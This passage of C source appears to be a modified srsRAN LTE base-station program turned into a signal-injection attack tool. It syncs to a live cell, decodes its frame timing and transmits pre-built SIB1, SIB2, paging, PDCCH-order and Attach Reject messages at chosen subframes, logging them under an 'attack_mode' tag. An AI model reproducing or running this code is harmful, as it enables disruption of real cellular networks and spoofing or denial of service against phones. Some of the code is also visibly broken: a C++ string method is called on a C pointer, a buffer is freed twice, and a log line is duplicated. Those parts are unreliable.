               //printf("test yg 1025 line 875 Set TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
             }
             break;
 #endif
         }
       } else {
         switch (input[0]) {
           case 'q':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 0;
             multiplex_nof_layers = 1;
             break;
           case 'w':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 1;
             multiplex_nof_layers = 1;
             break;
           case 'e':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 2;
             multiplex_nof_layers = 1;
             break;
           case 'r':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 3;
             multiplex_nof_layers = 1;
             break;
           case 'a':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 0;
             multiplex_nof_layers = 2;
             break;
           case 's':
             transmission_mode    = SRSRAN_TM4;
             multiplex_pmi        = 1;
             multiplex_nof_layers = 2;
             break;
           case 'z':
             transmission_mode = SRSRAN_TM3;
             break;
           case 'x':
             transmission_mode = SRSRAN_TM2;
             break;
           case CFR_THRES_UP_KEY:
             cfr_thr_inc = true;
             break;
           case CFR_THRES_DN_KEY:
             cfr_thr_dec = true;
             break;
           default:
             last_mcs_idx = mcs_idx;
             mcs_idx      = strtol(input, NULL, 10);
         }
       }
       bzero(input, sizeof(input));
       if (update_radl()) {
         printf("Trying with last known MCS index\n");
         mcs_idx    = last_mcs_idx;
         prbset_num = last_prbset_num;
         return update_radl();
       }
     }
     return 0;
   } else if (n < 0) {
     // error
     perror("select");
     return SRSRAN_ERROR;
   } else {
     return SRSRAN_SUCCESS;
   }
 }
 
 /** Function run in a separate thread to receive UDP data */
 static void* net_thread_fnc(void* arg)
 {
   int n;
   int rpm = 0, wpm = 0;
 
   do {
     n = srsran_netsource_read(&net_source, &data2[rpm], DATA_BUFF_SZ - rpm);
     if (n > 0) {
       // TODO: I assume that both transport blocks have same size in case of 2 tb are active
 
       int nbytes = 1 + (((mbsfn_area_id > -1) ? (pmch_cfg.pdsch_cfg.grant.tb[0].tbs)
                                               : (pdsch_cfg.grant.tb[0].tbs + pdsch_cfg.grant.tb[1].tbs)) -
                         1) /
                            8;
       rpm += n;
       INFO("received %d bytes. rpm=%d/%d", n, rpm, nbytes);
       wpm = 0;
       while (rpm >= nbytes) {
         // wait for packet to be transmitted
         sem_wait(&net_sem);
         if (mbsfn_area_id > -1) {
           memcpy(data_mbms, &data2[wpm], nbytes);
         } else {
           memcpy(data[0], &data2[wpm], nbytes / (size_t)2);
           memcpy(data[1], &data2[wpm], nbytes / (size_t)2);
         }
         INFO("Sent %d/%d bytes ready", nbytes, rpm);
         rpm -= nbytes;
         wpm += nbytes;
         net_packet_ready = true;
       }
       if (wpm > 0) {
         INFO("%d bytes left in buffer for next packet", rpm);
         memcpy(data2, &data2[wpm], rpm * sizeof(uint8_t));
       }
     } else if (n == 0) {
       rpm = 0;
     } else {
       ERROR("Error receiving from network");
       exit(-1);
     }
   } while (true);
 }
 
 static void read_file(cf_t *buff, char *file_name){
   FILE *fp = NULL;
   int cnt = 0;
   int i = 0;
   int total = 0;
   if (!buff) {
     printf("buff null\n");
   }
   fp = fopen(file_name, "rb");
   if (!fp) {
     perror("fopen");
     exit(-1);
   }
 
   while(!feof(fp)) {
     cnt = fread(buff+i, sizeof(cf_t), 1, fp);
     total += cnt;
     i++;
   }
   printf("File length:%d\n", total);
   fclose(fp);
 }
 
 #ifndef DISABLE_RF
 int srsran_rf_recv_wrapper(void* h, cf_t* data_[SRSRAN_MAX_PORTS], uint32_t nsamples, srsran_timestamp_t* t) {
   DEBUG(" ----  Receive %d samples  ----", nsamples);
   void* ptr[SRSRAN_MAX_PORTS];
   for (int i = 0; i < SRSRAN_MAX_PORTS; i++) {
     ptr[i] = data_[i];
   }
 
   return srsran_rf_recv_with_time_multi(h, ptr, nsamples, true, &(t->full_secs), &(t->frac_secs));
 }
 # endif
 
 // timed transmission
 static void* tx_thread_func() {
   unsigned long mask = 8; // processor 4   // 1 2 4 8 (1,2,3,4)
   if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
     perror("pthread_setaffinity_np");
   }
   srsran_timestamp_t future_time;
   bool start_of_burst = true;
   bool end_of_burst = true;
   bool first = true;
   float time_offset;
   time_offset = 0.014 - 0.0001;
 
   int cur_sf_idx;
   int cur_sfn;
   int target_sfn;
   int next_sfn = -1;
   int cur_rx_ret;
   srsran_timestamp_t cur_time;
   float estimated_cfo, estimated_sfo;
   bool fisrt_over = true;
   while (!go_exit) {
     pthread_mutex_lock(&mutex);
     while (updated == false) {
       pthread_cond_wait(&cond, &mutex);
     }
     updated = false;
 
     cur_sf_idx = sf_idx;
     cur_sfn = sfn;
     cur_rx_ret = rx_ret;
     //printf("ret:%d sfn:%d sf_idx:%d\n", rx_ret, sfn, sf_idx);

     memcpy(&cur_time, &last_stamp, sizeof(srsran_timestamp_t));
     pthread_mutex_unlock(&mutex);
     if (fisrt_over && cur_sfn >= 0) {
      target_sfn = cur_sfn;
      fisrt_over = false;
     }
     if (cur_sfn < target_sfn) {
      continue;     
     } else if (cur_sfn > target_sfn) {
      target_sfn = cur_sfn;
     }

     if (cur_rx_ret != 0) {
       ERROR("[Tx] rx_ret: %d\n",cur_rx_ret);
     }
     if (cur_rx_ret == 0 && cur_sfn >= 0 && first == true) {
       estimated_cfo = srsran_ue_sync_get_cfo(&ue_sync);
       estimated_sfo = srsran_ue_sync_get_sfo(&ue_sync);
       first = false;
       printf("Frequency offset estimated..........CFO: %f SFO: %f\n", estimated_cfo, estimated_sfo);
       continue;
     }
     if (cur_rx_ret == 0 && cur_sfn >= 0) {
       memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
       time_offset = (10 + 5 - cur_sf_idx) * 0.001 - 0.0001;
       srsran_timestamp_add(&future_time, 0, time_offset-(66.0 / 30720000.0));
/*
       future_time.frac_secs += time_offset;
       future_time.frac_secs -= (66.0 / 30720000.0); 
       if (future_time.frac_secs >= 1.0) {
         future_time.full_secs += (int) future_time.frac_secs;
         future_time.frac_secs -= (int) future_time.frac_secs;
       }*/
       next_sfn = (cur_sfn + 1) % 1024;
 
       int ret = -1;
       if (sib1_msg) {
         printf("%s [Subframe 5] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
         ret = srsran_rf_send_timed_multi(&radio, (void**) sib1_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
         if (ret != sf_n_samples) {
           printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
           exit(-1);
         }
         target_sfn = (target_sfn + 1) % 1024;
       } 
       if (cur_sf_idx == 0 && sib2_msg ) {
         printf("%s [Subframe 0] [future_time] next_sfn: %d %.f: %f s\n",attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
         ret = srsran_rf_send_timed_multi(&radio, (void**) sib2_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
         if (ret != sf_n_samples) {
           printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
           exit(-1);
         }
       }
       if (cur_sf_idx == 0 && po_msg ) {
        printf("%s [Subframe 0] [future_time] next_sfn: %d %.f: %f s\n",attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
        ret = srsran_rf_send_timed_multi(&radio, (void**) po_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
        if (ret != sf_n_samples) {
          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
          exit(-1);
        }
      }
      if (cur_sf_idx == 9 && ar_msg ) {
        printf("%s [Subframe 9] [future_time] next_sfn: %d %.f: %f s\n",attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
        ret = srsran_rf_send_timed_multi(&radio, (void**) ar_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
        if (ret != sf_n_samples) {
          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
          exit(-1);
        }
      }
      if (cur_sf_idx == 9 && ir_msg ) {
        printf("%s [Subframe 9] [future_time] next_sfn: %d %.f: %f s\n",attack_mode, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
        ret = srsran_rf_send_timed_multi(&radio, (void**) ir_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
        if (ret != sf_n_samples) {
          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
          exit(-1);
        }
      }
 
       if (cur_sf_idx == 9 && paging_msg ) { 
         
         printf("%s [Subframe 9 paging] [future_time] next_sfn: %d %.f: %f s\n", attack_mode,  next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
         ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
         if (ret != sf_n_samples) {
           printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
           exit(-1);
         }
       }
       first = false;
     }
   }
 
   return NULL;
 }
 
 static void* rx_thread_func() {
   unsigned long mask = 4; // processor 3, 1 2 4 8 (1,2,3,4)
   if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
     perror("pthread_setaffinity_np");
   }
 
   int ret;
   int n;
   bool acks[SRSRAN_MAX_CODEWORDS] = {false};
   srsran_cell_t cell;
   uint8_t bch_payload[SRSRAN_BCH_PAYLOAD_LEN];
   int     sfn_offset;
         
   while (!go_exit) {
     pthread_mutex_lock(&mutex);
 
     cf_t* buffers[SRSRAN_MAX_CHANNELS] = {};
     for (int p = 0; p < SRSRAN_MAX_PORTS; p++) {
       buffers[p] = sf_buffer_sync[p];
     }
     ret = srsran_ue_sync_zerocopy(&ue_sync, buffers, max_num_samples);
     
     if (ret != 1) {
       rx_ret = -1;
       sfn = -100;
       printf("srsran_ue_sync_zerocopy failed\n");
       updated = true;
       pthread_cond_signal(&cond);
       pthread_mutex_unlock(&mutex);
     }
     if (ret == 1) {
       rx_ret = 0;
       srsran_ue_sync_get_last_timestamp(&ue_sync, &last_stamp);
 
       sf_idx = srsran_ue_sync_get_sfidx(&ue_sync);
       if (sf_idx == 0) {
         n = srsran_ue_mib_decode(&ue_mib, bch_payload, NULL, &sfn_offset);
         if (n < 0) {
           ERROR("Error decoding UE MIB");
           exit(-1);
         } else if (n == 0) {
           sfn = -100;
           ERROR("MIB Decoding failed");
         } else if (n == SRSRAN_UE_MIB_FOUND) {
           srsran_pbch_mib_unpack(bch_payload, &cell, &sfn);
           sfn = (sfn + sfn_offset) % 1024;
         }
       }
       updated = true;
       pthread_cond_signal(&cond);
 
       if (sf_idx == 5 && (sfn % 2) == 0) {
         ue_dl_cfg.chest_cfg = chest_pdsch_cfg;
         dl_sf.tti = sfn * 10 + sf_idx;
         dl_sf.sf_type = SRSRAN_SF_NORM;
         ue_dl_cfg.cfg.tm = SRSRAN_TM1;
         ue_dl_cfg.cfg.pdsch.use_tbs_index_alt = false;
         n = srsran_ue_dl_find_and_decode(&ue_dl, &dl_sf, &ue_dl_cfg, &pdsch_cfg, data, acks);
       }
       pthread_mutex_unlock(&mutex);
       usleep(1);
     }
   }
 
   return NULL;
 }


// 工具函数：判断路径是否为目录
int is_directory(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    return S_ISDIR(st.st_mode);
}

// 工具函数：判断文件是否存在
int file_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0);
}

// 拼接路径（返回 malloc 的字符串，调用者负责释放）
char* path_join(const char* a, const char* b) {
    size_t len = strlen(a) + strlen(b) + 2;  // '/' + null
    char* result = malloc(len);
    if (!result) return NULL;
    snprintf(result, len, "%s/%s", a, b);
    return result;
}

// 递归搜索辅助函数
// found_path 是指向指针的指针，用于保存第一个匹配结果
// target_name 是要查找的目录名，如 "cell_100"
// pci 用于日志输出
void search_recursive(const char* root, const char* target_name, uint32_t pci, char** found_path) {
  DIR* dir = opendir(root);
  if (!dir) {
      fprintf(stderr, "[ERROR] Cannot open directory: %s (errno=%d)\n", root, errno);
      return;
  }

  struct dirent* entry;
  while ((entry = readdir(dir)) != NULL) {
      // 跳过 . 和 ..
      if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
          continue;

      char* subpath = path_join(root, entry->d_name);
      if (!subpath) continue;

      if (is_directory(subpath)) {
          // 检查是否是目标目录名
          if (strcmp(entry->d_name, target_name) == 0) {
              char* mib_path = path_join(subpath, "mib.json");
              if (mib_path && file_exists(mib_path)) {
                  if (*found_path == NULL) {
                      *found_path = strdup(subpath);  // 保存第一个匹配
                  } else {
                      // 多个匹配，警告
                      fprintf(stderr, "[WARNING] Multiple cell directories found for PCI=%u:\n", pci);
                      fprintf(stderr, "   %s\n", *found_path);
                      fprintf(stderr, "   %s\n", subpath);
                      fprintf(stderr, "   Using first one.\n");
                  }
                  free(mib_path);
              } else {
                  fprintf(stderr, "[DEBUG] Missing mib.json in: %s\n", subpath);
              }
              free(mib_path);
          }

          // 继续递归进入子目录
          search_recursive(subpath, target_name, pci, found_path);
      }

      free(subpath);
  }

  closedir(dir);
}

// 主函数：查找 cell_<pci> 目录
char* find_cell_dir(const char* cache_root, uint32_t pci) {
  char target_name[64];
  snprintf(target_name, sizeof(target_name), "cell_%u", pci);

  char* found_path = NULL;  // 用于保存结果

  search_recursive(cache_root, target_name, pci, &found_path);

  return found_path;  // 调用者需 free()
}
int main(int argc, char** argv)
 {
   int                   nf = 0, N_id_2 = 0;
   cf_t                  pss_signal[SRSRAN_PSS_LEN];
   float                 sss_signal0[SRSRAN_SSS_LEN]; // for subframe 0
   float                 sss_signal5[SRSRAN_SSS_LEN]; // for subframe 5
   uint8_t               bch_payload[SRSRAN_BCH_PAYLOAD_LEN];
   int                   i;
   cf_t*                 sf_symbols[SRSRAN_MAX_PORTS];
   srsran_dci_msg_t      dci_msg;
   srsran_dci_location_t locations[SRSRAN_NOF_SF_X_FRAME][30];
   uint32_t              sfn;
   srsran_refsignal_t    csr_refs;
   srsran_refsignal_t    mbsfn_refs;
   float search_cell_cfo = 0;
   int decimate = 1;
 
   srsran_use_standard_symbol_size(true);
   srsran_debug_handle_crash(argc, argv);
 
 #ifdef DISABLE_RF
   if (argc < 3) {
     usage(argv[0]);
     exit(-1);
   }
 #endif
 
   parse_args(argc, argv);

   char* cell_dir = find_cell_dir(cache_root, cell.id);
   if (cell_dir.empty()) {
       fprintf(stderr, "[ERROR] Cell not found\n");
       return -1;
   }  
   output_dir_str = cell_dir;           // 赋值给 string
   output_dir = output_dir_str.c_str(); // 再转成 const char*
   snprintf(mib_path, sizeof(mib_path), "%s/mib.hex", output_dir);
   snprintf(sib1_path, sizeof(sib1_path), "%s/sib1.hex", output_dir);
   snprintf(sib2_path, sizeof(sib2_path), "%s/sib2.hex", output_dir);
   snprintf(cell_config_path, sizeof(cell_config_path), "%s/cell.json", output_dir);

   if (parse_cfr_args() < SRSRAN_SUCCESS) {
     ERROR("Error parsing CFR args");
     exit(-1);
   }
   uint8_t mch_table[10];
   bzero(&mch_table[0], sizeof(uint8_t) * 10);
   if (mbsfn_area_id > -1) {
     generate_mcch_table(mch_table, mbsfn_sf_mask);
   }
   N_id_2       = cell.id % 3;
   sf_n_re      = SRSRAN_SF_LEN_RE(cell.nof_prb, cell.cp);
   sf_n_samples = 1.2 * 2 * SRSRAN_SLOT_LEN(srsran_symbol_sz(cell.nof_prb));
   cell.phich_length    = SRSRAN_PHICH_NORM;
   cell.phich_resources = SRSRAN_PHICH_R_1;
   sfn                  = 0;
   prbset_num      = (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb));
   last_prbset_num = prbset_num;
   base_init();
   /* Generate PSS/SSS signals */
   srsran_pss_generate(pss_signal, N_id_2);
   srsran_sss_generate(sss_signal0, sss_signal5, cell.id);
 
   /* Generate reference signals */
   if (srsran_refsignal_cs_init(&csr_refs, cell.nof_prb)) {
     ERROR("Error initializing equalizer");
     exit(-1);
   }
   if (mbsfn_area_id > -1) {
     if (srsran_refsignal_mbsfn_init(&mbsfn_refs, cell.nof_prb)) {
       ERROR("Error initializing equalizer");
       exit(-1);
     }
     if (srsran_refsignal_mbsfn_set_cell(&mbsfn_refs, cell, mbsfn_area_id)) {
       ERROR("Error initializing MBSFNR signal");
       exit(-1);
     }
   }
 
   if (srsran_refsignal_cs_set_cell(&csr_refs, cell)) {
     ERROR("Error setting cell");
     exit(-1);
   }
 
   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
     sf_symbols[i] = sf_buffer[i % cell.nof_ports];
   }
 
 #ifndef DISABLE_RF
 
   sigset_t sigset;
   sigemptyset(&sigset);
   sigaddset(&sigset, SIGINT);
   sigprocmask(SIG_UNBLOCK, &sigset, NULL);
   signal(SIGINT, sig_int_handler);
 
   if (!output_file_name) {
     int srate = srsran_sampling_freq_hz(cell.nof_prb);
     printf("srate:%d\n", srate);
     printf("nof_prb:%d\n", cell.nof_prb);
     if (srate != -1) {
 
       printf("Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
       float srate_rf = srsran_rf_set_tx_srate(&radio, (double)srate);
       if (srate_rf != srate) {
         ERROR("Could not set sampling rate");
         exit(-1);
       }
     } else {
       ERROR("Invalid number of PRB %d", cell.nof_prb);
       exit(-1);
     }
     srsran_rf_set_tx_gain_ch(&radio, 0, rf_gain);
     srsran_rf_set_tx_gain_ch(&radio, 1, rf_gain);
     printf("Get TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
     printf("Set TX freq: %.2f MHz\n", srsran_rf_set_tx_freq(&radio, cell.nof_ports, rf_freq) / 1000000);
     printf("Set RX freq: %.2f MHz\n", srsran_rf_set_rx_freq(&radio, cell.nof_ports, rf_freq) / 1000000);
     srsran_rf_set_rx_gain(&radio, 40);
     printf("Get RX gain: %.1f dB\n", srsran_rf_get_rx_gain(&radio));
     
     uint32_t ntrial = 0;
     int ret = 0;
     do {
       ret = rf_search_and_decode_mib(&radio, transmission_mode+1, &cell_detect_config, -1, &cell, &search_cell_cfo);
       if (ret < 0) {
         ERROR("Error searching for cell");
         exit(-1);
       } else if (ret == 0 && !go_exit) {
         printf("Cell not found after %d trials. Trying again (Press Ctrl+C to exit)\n", ntrial++);
       }
     } while (ret == 0 && !go_exit);
     
     if (go_exit) {
       srsran_rf_close(&radio);
       exit(0);
     }
 
     /* set sampling frequency */
     printf("Setting sampling rate %.2f MHz\n", (float)srate / 1000000);
     float srate_rf2 = srsran_rf_set_rx_srate(&radio, (double)srate);
     if (srate_rf2 != srate) {
       ERROR("Could not set sampling rate");
       exit(-1);
     }
 
     /* ue sync pss and sss */
     if (srsran_ue_sync_init_multi_decim(&ue_sync,
                                         cell.nof_prb,
                                         cell.id == 1000,
                                         srsran_rf_recv_wrapper,
                                         1, // prog_args.rf_nof_rx_ant,
                                         (void*)&radio,
                                         decimate)) {
       ERROR("Error initiating ue_sync");
       exit(-1);
     }
     if (srsran_ue_sync_set_cell(&ue_sync, cell)) {
       ERROR("Error initiating ue_sync");
       exit(-1);
     }
 
     if (paging_msg) {
       printf ("Ready PAGING Case!\n");
       read_file(paging_buffer[0], paging_file);
     }
   
     if (sib1_msg) {
       printf ("Ready SIB1 Case!\n");
       read_file(sib1_buffer[0], sib1_file);
     }
 
     if (sib2_msg) {
       printf ("Ready SIB2 Case!\n");
       read_file(sib2_buffer[0], sib2_file);
     }

     if (po_msg) {
      printf ("Ready Pdcch Order Case!\n");
      read_file(po_buffer[0], po_file);
    }

    if (ar_msg) {
      printf ("Ready Attach Reject Case!\n");
      read_file(ar_buffer[0], ar_file);
    }
    if (ir_msg) {
      printf ("Ready Attach Reject Case!\n");
      read_file(ir_buffer[0], ir_file);
    }
     
     /* init memory */
     max_num_samples = 3 * SRSRAN_SF_LEN_PRB(SRSRAN_MAX_PRB); /// Length in complex samples
     for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
       sf_buffer_sync[i] = srsran_vec_cf_malloc(max_num_samples);
     }
     if (srsran_ue_mib_init(&ue_mib, sf_buffer_sync[0], cell.nof_prb)) {
       ERROR("Error initaiting UE MIB decoder");
       exit(-1);
     }
     if (srsran_ue_mib_set_cell(&ue_mib, cell)) {
       ERROR("Error initaiting UE MIB decoder");
       exit(-1);
     }
     if (srsran_ue_dl_init(&ue_dl, sf_buffer_sync, cell.nof_prb, 1)) {
       ERROR("Error initiating UE downlink processing module");
       exit(-1);
     }
     if (srsran_ue_dl_set_cell(&ue_dl, cell)) {
       ERROR("Error initiating UE downlink processing module");
       exit(-1);
     } 
     ue_sync.cfo_current_value       = search_cell_cfo / 15000;
     ue_sync.cfo_is_copied           = true;
     ue_sync.cfo_correct_enable_find = true;
     ue_sync.cfo_correct_enable_track = true;
     srsran_sync_set_cfo_cp_enable(&ue_sync.sfind, false, 0);
     
     ZERO_OBJECT(ue_dl_cfg);
     ZERO_OBJECT(chest_pdsch_cfg);
     ZERO_OBJECT(dl_sf);
     ZERO_OBJECT(pdsch_cfg);
     pdsch_cfg.meas_evm_en = true;
     chest_pdsch_cfg.cfo_estimate_enable   = false;
     chest_pdsch_cfg.cfo_estimate_sf_mask  = 1023;
     chest_pdsch_cfg.estimator_alg         = srsran_chest_dl_str2estimator_alg("interpolate");
     chest_pdsch_cfg.sync_error_enable     = true;
     srsran_softbuffer_rx_t rx_softbuffers[SRSRAN_MAX_CODEWORDS];
     for (uint32_t i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
       pdsch_cfg.softbuffers.rx[i] = &rx_softbuffers[i];
       srsran_softbuffer_rx_init(pdsch_cfg.softbuffers.rx[i], cell.nof_prb);
     }
     pdsch_cfg.rnti = UE_CRNTI;
 
     srsran_pbch_decode_reset(&ue_mib.pbch);
     srsran_rf_start_rx_stream(&radio, false); 
 
     if (pthread_create(&tx_thread, NULL, tx_thread_func, NULL)) {
       perror("tx_thread_funx pthread create failed");
       exit(-1);
     }
     if (pthread_create(&rx_thread, NULL, rx_thread_func, NULL)) {
       perror("rx_thread_funx pthread create failed");
       exit(-1);
     }
 
     int status;
     printf("Start message inject!\n");
     pthread_join(tx_thread, (void**)&status);
     pthread_join(rx_thread, (void**)&status);
 
     status = pthread_mutex_destroy(&mutex);
     srsran_ue_sync_free(&ue_sync);
     srsran_rf_close(&radio);
     printf("code = %d\n Inject Done\n", status);
     exit(0);
   }
 #endif
   printf("line 1427-----------------------------------------------------------------------\n");
 
   if (update_radl()) {
     exit(-1);
   }
 
   if (net_port > 0) {
     if (pthread_create(&net_thread, NULL, net_thread_fnc, NULL)) {
       perror("pthread_create");
       exit(-1);
     }
   }
   pmch_cfg.pdsch_cfg.grant.tb[0].tbs = 1096;
 
   srsran_dl_sf_cfg_t dl_sf;
   ZERO_OBJECT(dl_sf);
 
   /* Initiate valid DCI locations */
   for (i = 0; i < SRSRAN_NOF_SF_X_FRAME; i++) {
     dl_sf.cfi = cfi;
     dl_sf.tti = i;
     srsran_pdcch_ue_locations(&pdcch, &dl_sf, locations[i], 30, UE_CRNTI);
   }
 
   nf = 0;
 
   bool send_data = false;
   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
     srsran_softbuffer_tx_reset(softbuffers[i]);
   }
 
 #ifndef DISABLE_RF
   bool start_of_burst = true;
 #endif
 
   ZERO_OBJECT(pdsch_cfg);
   for (uint32_t j = 0; j < SRSRAN_MAX_CODEWORDS; j++) {
     pdsch_cfg.softbuffers.tx[j] = softbuffers[j];
   }
   pdsch_cfg.rnti = UE_CRNTI;
 
   pmch_cfg.pdsch_cfg = pdsch_cfg;
 
   while ((nf < nof_frames || nof_frames == -1) && !go_exit) {
     for (sf_idx = 0; sf_idx < SRSRAN_NOF_SF_X_FRAME && (nf < nof_frames || nof_frames == -1) && !go_exit; sf_idx++) {
       /* Set Antenna port resource elements to zero */
       srsran_vec_cf_zero(sf_symbols[0], sf_n_re);
 
       if (sf_idx == 0 || sf_idx == 5) {
         srsran_pss_put_slot(pss_signal, sf_symbols[0], cell.nof_prb, cell.cp);
         srsran_sss_put_slot(sf_idx ? sss_signal5 : sss_signal0, sf_symbols[0], cell.nof_prb, cell.cp);
       }
       //test yg 1108
       //printf("line 1479\n");
       /* Copy zeros, SSS, PSS into the rest of antenna ports */
       for (i = 1; i < cell.nof_ports; i++) {
         memcpy(sf_symbols[i], sf_symbols[0], sizeof(cf_t) * sf_n_re);
       }
 
       if (mch_table[sf_idx] == 1 && mbsfn_area_id > -1) {
         srsran_refsignal_mbsfn_put_sf(cell, 0, csr_refs.pilots[0][sf_idx], mbsfn_refs.pilots[0][sf_idx], sf_symbols[0]);
       } else {
         dl_sf.tti = nf * 10 + sf_idx;
         for (i = 0; i < cell.nof_ports; i++) {
           srsran_refsignal_cs_put_sf(&csr_refs, &dl_sf, (uint32_t)i, sf_symbols[i]);
         }
       }
 
       srsran_pbch_mib_pack(&cell, sfn, bch_payload);
       if (sf_idx == 0) {
         srsran_pbch_encode(&pbch, bch_payload, sf_symbols, nf % 4);
       }
 
       dl_sf.tti = nf * 10 + sf_idx;
       dl_sf.cfi = cfi;
 
       srsran_pcfich_encode(&pcfich, &dl_sf, sf_symbols);
 
       /* Update DL resource allocation from control port */
       if (update_control() < SRSRAN_SUCCESS) {
         ERROR("Error updating parameters from control port");
       }
 
       /* Transmit PDCCH + PDSCH only when there is data to send */
       if ((net_port > 0) && (mch_table[sf_idx] == 1 && mbsfn_area_id > -1)) {
         send_data = net_packet_ready;
         if (net_packet_ready) {
           INFO("Transmitting packet from port");
         }
       } else {
         INFO("SF: %d, Generating %d random bits", sf_idx, pdsch_cfg.grant.tb[0].tbs + pdsch_cfg.grant.tb[1].tbs);
         for (uint32_t tb = 0; tb < SRSRAN_MAX_CODEWORDS; tb++) {
           if (pdsch_cfg.grant.tb[tb].enabled) {
             for (i = 0; i < pdsch_cfg.grant.tb[tb].tbs / 8; i++) {
               data[tb][i] = (uint8_t)rand();
             }
           }
         }
         /* Uncomment this to transmit on sf 0 and 5 only  */
         if (sf_idx != 0 && sf_idx != 5) {
           send_data = true;
         } else {
           send_data = false;
         }
       }
       if (send_data) {
         if (mch_table[sf_idx] == 0 || mbsfn_area_id < 0) { // PDCCH + PDSCH
           dl_sf.sf_type = SRSRAN_SF_NORM;
 
           /* Encode PDCCH */
           INFO("Putting DCI to location: n=%d, L=%d", locations[sf_idx][0].ncce, locations[sf_idx][0].L);
 
           srsran_dci_msg_pack_pdsch(&cell, &dl_sf, NULL, &dci_dl, &dci_msg);
           dci_msg.location = locations[sf_idx][0];
           if (srsran_pdcch_encode(&pdcch, &dl_sf, &dci_msg, sf_symbols)) {
             ERROR("Error encoding DCI message");
             exit(-1);
           }
 
           /* Configure pdsch_cfg parameters */
           if (srsran_ra_dl_dci_to_grant(&cell, &dl_sf, transmission_mode, enable_256qam, &dci_dl, &pdsch_cfg.grant)) {
             ERROR("Error configuring PDSCH");
             exit(-1);
           }
 
           /* Encode PDSCH */
           if (srsran_pdsch_encode(&pdsch, &dl_sf, &pdsch_cfg, data, sf_symbols)) {
             ERROR("Error encoding PDSCH");
             exit(-1);
           }
           if (net_port > 0 && net_packet_ready) {
             if (null_file_sink) {
               for (uint32_t tb = 0; tb < SRSRAN_MAX_CODEWORDS; tb++) {
                 srsran_bit_pack_vector(data[tb], data_tmp, pdsch_cfg.grant.tb[tb].tbs);
                 if (srsran_netsink_write(&net_sink, data_tmp, 1 + (pdsch_cfg.grant.tb[tb].tbs - 1) / 8) < 0) {
                   ERROR("Error sending data through UDP socket");
                 }
               }
             }
             if (mbsfn_area_id < 0) {
               net_packet_ready = false;
               sem_post(&net_sem);
             }
           }
         } else { // We're sending MCH on subframe 1 - PDCCH + PMCH
           dl_sf.sf_type = SRSRAN_SF_MBSFN;
 
           /* Force 1 word and MCS 2 */
           dci_dl.rnti                    = SRSRAN_MRNTI;
           dci_dl.alloc_type              = SRSRAN_RA_ALLOC_TYPE0;
           dci_dl.type0_alloc.rbg_bitmask = 0xffffffff;
           dci_dl.tb[0].mcs_idx           = 2;
           dci_dl.format                  = SRSRAN_DCI_FORMAT1;
 
           /* Configure pdsch_cfg parameters */
           if (srsran_ra_dl_dci_to_grant(&cell, &dl_sf, SRSRAN_TM1, enable_256qam, &dci_dl, &pmch_cfg.pdsch_cfg.grant)) {
             ERROR("Error configuring PDSCH");
             exit(-1);
           }
 
           for (int j = 0; j < pmch_cfg.pdsch_cfg.grant.tb[0].tbs / 8; j++) {
             data_mbms[j] = j % 255;
           }
 
           pmch_cfg.area_id = mbsfn_area_id;
 
           /* Encode PMCH */
           if (srsran_pmch_encode(&pmch, &dl_sf, &pmch_cfg, data_mbms, sf_symbols)) {
             ERROR("Error encoding PDSCH");
             exit(-1);
           }
           if (net_port > 0 && net_packet_ready) {
             if (null_file_sink) {
               srsran_bit_pack_vector(data[0], data_tmp, pmch_cfg.pdsch_cfg.grant.tb[0].tbs);
               if (srsran_netsink_write(&net_sink, data_tmp, 1 + (pmch_cfg.pdsch_cfg.grant.tb[0].tbs - 1) / 8) < 0) {
                 ERROR("Error sending data through UDP socket");
               }
             }
             net_packet_ready = false;
             sem_post(&net_sem);
           }
         }
       }
 
       /* Transform to OFDM symbols */
       if (mch_table[sf_idx] == 0 || mbsfn_area_id < 0) {
         for (i = 0; i < cell.nof_ports; i++) {
           srsran_ofdm_tx_sf(&ifft[i]);
         }
       } else {
